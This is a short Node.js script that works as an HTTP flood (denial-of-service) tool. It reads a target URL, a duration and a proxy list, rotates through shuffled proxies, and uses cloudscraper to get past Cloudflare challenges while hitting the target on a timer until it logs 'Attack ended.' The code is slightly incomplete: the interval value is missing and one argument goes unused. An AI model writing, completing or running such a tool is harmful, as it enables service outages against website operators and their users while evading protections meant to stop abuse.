const fs = require('fs');
const CloudScraper = require('cloudscraper');
const path = require('path');

const target = process.argv[2];
const time = process.argv[3];
const req_per_ip = process.argv[4];
const proxiesFilePath = process.argv[5];

let proxies = fs.readFileSync(proxiesFilePath, 'utf-8')
               .replace(/\r/gi, '')
               .split('\n')
               .filter(Boolean);

// Shuffle the proxies array to improve randomness
shuffle(proxies);

let index = 0;

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

function sendRequest() {
    let proxy = proxies[index];

    CloudScraper({
        uri: target,
        resolveWithFullResponse: true,
        proxy: 'http://' + proxy,
        challengesToSolve: 10
    }, function (error, response) {
        if (error) {
            console.error(error.message);
        }

        if (++index >= proxies.length) {
            index = 0;
        }
    });
}

function startAttack() {
    setInterval(sendRequest, /* interval in milliseconds */);
    setTimeout(() => {
        console.log('Attack ended.');
        process.exit(0);
    }, time * 1000);
}

startAttack();
